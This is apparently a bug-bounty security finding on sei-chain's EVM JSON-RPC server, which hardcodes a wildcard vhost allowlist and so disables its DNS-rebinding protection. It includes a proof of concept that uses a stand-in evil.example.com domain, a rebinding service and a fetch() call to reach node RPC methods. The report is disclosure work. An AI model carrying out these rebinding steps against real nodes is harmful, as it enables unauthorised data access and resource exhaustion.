### Title
EVM JSON-RPC HTTP server disables DNS-rebinding protection with a hardcoded wildcard Vhosts allowlist - (File: evmrpc/server.go)

### Summary
The `sei-chain` EVM JSON-RPC HTTP server ports its Host-header (vhost) anti-DNS-rebinding defense from go-ethereum, but hardcodes the allowlist to `"*"` in `NewEVMHTTPServer`, unconditionally disabling the protection for every node regardless of operator configuration.

### Finding Description
`evmrpc/rpcstack.go` implements `virtualHostHandler`, whose own doc comment states its purpose explicitly: [1](#0-0) 

The handler validates the incoming `Host` header against an operator-supplied allowlist, and only serves the request if the host is an IP literal, matches an allowlisted entry, or the allowlist contains the wildcard `"*"`: [2](#0-1) 

This is wired into the request pipeline in `EnableRPC` via `NewHTTPHandlerStack`, which composes `newCorsHandler` and `newVHostHandler`: [3](#0-2) 

The root cause is that `NewEVMHTTPServer` in `evmrpc/server.go` builds the `HTTPConfig` with `Vhosts` hardcoded to `[]string{"*"}` — not derived from any `app.toml`/`evmrpcconfig.Config` field, and not overridable by node operators: [4](#0-3) 

This is functionally identical to the SillyTavern flaw: a Host-header allowlist mechanism exists specifically to defeat DNS rebinding, but it is effectively disabled (SillyTavern: disabled by default; sei-chain: permanently wildcarded and non-configurable), leaving CORS (`Access-Control-Allow-Origin`, based on the `Origin` header) as the only remaining SOP-style control. DNS rebinding specifically defeats CORS because the attacker's page and the rebound target share the exact same origin (scheme+host+port) from the browser's perspective once the DNS record is repointed to the victim's IP — no `Origin` cross-origin check is even triggered, since the browser treats it as a same-origin fetch.

### Impact Explanation
Any operator running `seid` with the EVM JSON-RPC HTTP server enabled (default `LocalAddress = "0.0.0.0"`, see `evmrpc/server.go` line 28 and `httpServer.SetListenAddr(LocalAddress, config.HTTPPort)`) is exposed to DNS rebinding regardless of firewalling or IP allowlisting intent, because the Host-header check that is supposed to be the last line of defense against this bypass is neutralized. An attacker who lures anyone with network path to a node's EVM RPC port (validator operator, RPC-node operator, or any LAN user) to a malicious webpage can make the victim's browser issue arbitrary JSON-RPC calls that resolve, same-origin, straight to the node's RPC port — bypassing network segmentation/firewall assumptions the operator relied on. Reachable methods include full read access (`eth_getBalance`, `eth_getTransactionByHash`, `debug_traceTransaction`, etc.) and `eth_sendRawTransaction`, plus CPU/memory-heavy `debug_trace*` calls exposed through the same public surface without additional origin-based gating (`evmrpc/server.go` registers the `debug` namespace unconditionally, lines 194-197). Repeated invocation of expensive trace/simulation RPCs through this rebinding bypass can be used to drive resource exhaustion on a public-facing RPC node, satisfying the "crash of default-configuration RPC nodes" impact bucket in this program's accepted-impact list.

### Likelihood Explanation
Exploitation only requires an unprivileged attacker to control a domain and a small amount of client-side JavaScript, and to get a single victim's browser (operating on a machine with network reachability to the target's EVM RPC port, e.g. an internal dashboard user, another validator's staff, or an RPC gateway operator) to load the page — the exact PoC pattern in the referenced advisory. Because `Vhosts: []string{"*"}` is hardcoded, this is not something operators can fix via `app.toml`; it always applies, on every deployment of this codebase's EVM RPC server, which is a substantial expansion of likelihood compared to a config-dependent bug.

### Recommendation
Make `Vhosts` operator-configurable (e.g. via `evmrpcconfig.Config`, analogous to `CORSOrigins`/`WSOrigins`), default it to a safe value (e.g. `localhost`, node's own advertised hostname, or an explicit allowlist) rather than `"*"`, and document that operators exposing the EVM RPC beyond localhost must add their externally-reachable hostnames to the list. At minimum, do not hardcode the wildcard in `NewEVMHTTPServer`.

### Proof of Concept
1. Run a `seid` node with the default EVM JSON-RPC HTTP server enabled (`evm.http_enabled = true`), reachable at some IP not intended to be publicly exposed (e.g. behind a firewall reachable only from a specific LAN or from a trusted operator's browser).
2. Host an attacker page (as in the referenced advisory's `rebind.html`) on `evil.example.com:8000` and use a DNS-rebinding service (e.g. `lock.cmpxchg8b.com`) to make `evil.example.com` initially resolve to the attacker's server, then rebind to the target node's RPC IP.
3. From the victim's browser, load the attacker page; once DNS rebinds, `fetch("http://evil.example.com:8545", {method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({jsonrpc:"2.0",method:"eth_getBalance",params:["0x...","latest"],id:1})})` is now same-origin from the browser's perspective and reaches the node's `evmrpc` HTTP handler.
4. On the server side, `virtualHostHandler.ServeHTTP` (`evmrpc/rpcstack.go:496-522`) receives `r.Host == "evil.example.com:8545"`; since `h.vhosts` contains `"*"` (from `evmrpc/server.go:212`), the request is forwarded to the JSON-RPC dispatcher unconditionally, and the attacker's page receives the full JSON-RPC response (balances, transactions, or the ability to submit `eth_sendRawTransaction` / expensive `debug_trace*` calls), demonstrating the DNS-rebinding bypass of the Host-header defense.

```go
// ServeHTTP serves JSON-RPC requests over HTTP, implements http.Handler
func (h *virtualHostHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// if r.Host is not set, we can continue serving since a browser would set the Host header
	if r.Host == "" {
		h.next.ServeHTTP(w, r)
		return
	}
	host, _, err := net.SplitHostPort(r.Host)
	if err != nil {
		// Either invalid (too many colons) or no port specified
		host = r.Host
	}
	if ipAddr := net.ParseIP(host); ipAddr != nil {
		// It's an IP address, we can serve that
		h.next.ServeHTTP(w, r)
		return
	}
	// Not an IP address, but a hostname. Need to validate
	if _, exist := h.vhosts["*"]; exist {
		h.next.ServeHTTP(w, r)
		return
	}
	if _, exist := h.vhosts[host]; exist {
		h.next.ServeHTTP(w, r)
		return
	}
	http.Error(w, "invalid host specified", http.StatusForbidden)
}
```
